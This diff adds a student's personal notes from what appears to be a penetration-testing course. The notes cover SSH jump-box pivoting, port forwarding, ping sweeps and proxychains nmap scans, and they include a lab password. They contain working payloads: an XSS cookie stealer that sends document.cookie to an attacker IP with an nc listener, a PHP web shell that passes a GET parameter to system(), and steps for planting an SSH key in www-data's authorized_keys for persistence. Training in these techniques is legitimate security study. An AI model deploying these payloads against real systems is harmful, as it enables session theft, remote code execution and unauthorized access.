@@ -1,0 +1,191 @@
+ssh -fNMS /tmp/jump demo1@10.50.12.137 
+
+ssh -fNMS /tmp/jump -O exit demo1@10.50.12.137 to back out session
+
+ssh -S /tmp/jump jump -O foward -D 9050   allows to proxychains
+
+for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done   to do ping sweep
+
+ssh -S /tmp/jump demo1@10.50.12.137 -O forward -L 1111:192.168.28.100:80 -L1112:192.168.28.100:2222     local port forwarding
+or 
+ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L1112:192.168.28.100:2222
+ss -ntlp
+
+
+Hypothetical:
+proxychains nmap 192.168.28.100
+(found port 80 and 2222)
+ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L1112:192.168.28.100:2222
+
+ssh -MS /tmp/t1 creds@127.0.0.1 -p 1112
+
+ssh -S /tmp/t1 t1 -O foward -D 9050
+(proxychains nmap)
+ssh -S /tmp/t1 t1 -O foward -L 3111:172.168.50.25:80
+
+
+
+
+
+
+nmap -p 2222 --script *ftp* ipaddress
+
+if 1111 was port 80:
+nmap -p 1111 --script *http* 
+or 
+proxychains nmap -p 80 --script *http* ipaddress
+
+
+
+
+White board:
+
+OP station -> Jump Box -> t1 -> t2
+
+ssh -MS /tmp/jump <user>@<jump>(-fN)
+ssh -S /tmp/jump jump -O forward -D 9050 -L <local port>:target ip:<target port>
+ssh -MS /tmp/t1 <t1 <target cred>@localhost -p <local port>
+ssh -S /tmp/t1 t1 -O forward -D 9050 -L <local port>:target ip: <target port>
+nmap -sV -Pn -n -T5 <target ip>
+nmap -p <target port> --script *protocol* <target ip>
+
+Methodology
+1. Establish connection to jump
+ssh -MS /tmp/jump <user>@<jump ip>
+2. From jump, scan target network (find ports)
+for i in {1..254}; do (ping -c 1 x.x.x.$i | grep "bytes from" &); done
+3. Build proxychains
+linOps: ssh -S /tmp/jump jump(name doesn't matter) -O forward -D 9050
+4. Port enumeration (host u found during ping sweep)
+proxychains nmap -Pn -sV -n -T5 <target ip>
+5. Use results to build port forward
+ssh -S /tmp/jump jump -O forward -D 9050 -L <local port>:target ip:<target port>
+6. Build into t1
+ssh -MS /tmp/t1 <user>@localhost -p <local port>
+7. port forward into t1
+ssh -S /tmp/t1 t1 -O forward -D 9050 -L <local port>:target ip:<target port>
+8. Repeat DEEPER
+
+
+(-O exit to back out)
+X6zKyTRAsSEI
+
+MOJM-M-202
+Slack#1
+Password:X6zKyTRAsSEI
+Jump:10.50.15.90
+
+
+Demo:
+ssh -MS /tmp/demo1 demo1@10.50.12.147
+for i in {1..254}; do (ping -c 1 10.208.50.$i | grep "bytes from" &); done
+ssh -S /tmp/demo1 demo -O forward -D 9050
+proxychains nmap -Pn -sV -n -T5 10.208.50.42,61,200,230
+.42 22,80
+.61 22,80,3389
+.200 22
+.230 Non available IP (it hangs)
+
+
+ssh -S /tmp/demo1 demo -O forward -D 9050 -L 1234:10.208.50.42:22 -L 1235:10.208.50.42:80 -L 1236:10.208.50.61:22 -L 1237:10.208.50.61:80 -L 1238:10.208.50.61:3389 -L 1239:10.208.50.200:22
+
+proxychains nmap -sT -T5 --script=http-enum 10.208.50.42,61,200,230
+
+http://127.0.0.1:1235/robots.txt
+
+(syntax to ssh using socket local port)
+ssh -S /tmp/demo1 student@localhost -p 1234
+
+
+
+opNotes: 
+
+in /var/www/html
+
+User-agent: *
+Allow: /uploads
+Allow: /chat
+Allow: /cmdinjection
+Allow: /java
+Allow: /path
+Allow: /webexample
+Disallow: /cross        (Disallow doesn't mean its not allowed)
+Disallow: /
+
+User-agent: Googlebot
+Disallow: /
+
+
+User-agent: Baiduspider
+Disallow: /
+
+
+(to open found directories)
+(newtab)(127.0.0.1:1235/cross)
+
+
+
+
+if ur typing something in a..
+url:GET
+input field: POST
+
+
+
+
+
+cookie stealer:
+<script>document.location="http://10.50.157.204:42067/?username=" + document.cookie;</script>
+
+<script>document.location="http://127.0.0.1:42067/?username=" + document.cookie;</script>
+
+nc -lk 10.50.157.204 42067
+
+
+robots.txt look into osint
+
+
+
+if its bugging
+ps -elf | grep ssh    (Kill all ssh)
+kill against that pid
+everything below bin and above color
+ls /tmp
+
+
+
+
+malicious file upload: 
+<HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+
+ssh keygen:
+ssh-keygen -t rsa -b 4096
+click enter 3 times no passphrase and save to default
+ls -lisa .ssh
+cat .ssh/id_rsa.pub (got key)
+(v ran these commands on browser v)
+whoami
+cat /etc/passwd (check user's home directory)(var/www)
+mkdir /var/www/.ssh 
+touch /var/www/.ssh/authorized_keys   
+ls/home/username/.ssh/authorized_keys
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDcroHaLxHJnof+BZj6o7G/qrP9wh5GP2/fU7k2Y5yHbg63DDdrJ8qEPODjRoEr0UpGYAuLfrHcXr1OuLa+PgVkCPHnNKOzClCeQckAP9tQwbMHKk7WEnBcJNBOvn9K2KSFxld4OEUrAcSCTzAlLiO+G/PiCt10HpvVRHI+n2nGhweH5X2gpZayBQ13VnYiRHg95oywYHtNqd3kmBFvZptIsQAXX78vqjfOj3cnH4pwAB9mJiFg2q+JsbG1E3hostMFCdB0xH/9dpBD0GhD15+6OyKxe1Qkum+5RPdbdWFfHHp3vlggachhguUN22l1kbWJmZyTZoX2E3LA4IMD1BZZbsrNTtnXydAb7+Ey6uepZMPHz44JGgzJRvw0t5RGg0524cax+h1XDk9YWwhgfTj7fboV0z1RiAG/s8SvnHYj6E4VVg5fHZA95MAcPdrP2LMC7OWeaHizCslqVu9DrHg62K7exYENZEAsL3IrelpnNefzmzmLXIv6+qpAmPPOdiwN82fLPX4fkCELbB85l/HOXjgDKyDkdPh7yxuTNlXfnfcWGMcAczTAl6jrwUdyMEMbU31Zl7itsoAmU6PfcQnjI8rUMMUW0DIpevkJr3Vw+TzdkDEhswNKmp+wO4T5WD3VNfwgVkpj1iOLT27OkaZbxs1MzuUR9tBcdDdmptpD5w== student@lin-ops" >> /var/www/.ssh/authorized_keys
+
+
+echo "key" >> /users home directory/.ssh/authorized_keys
+
+ssh www-data@localhost -p 1234
+    (User)
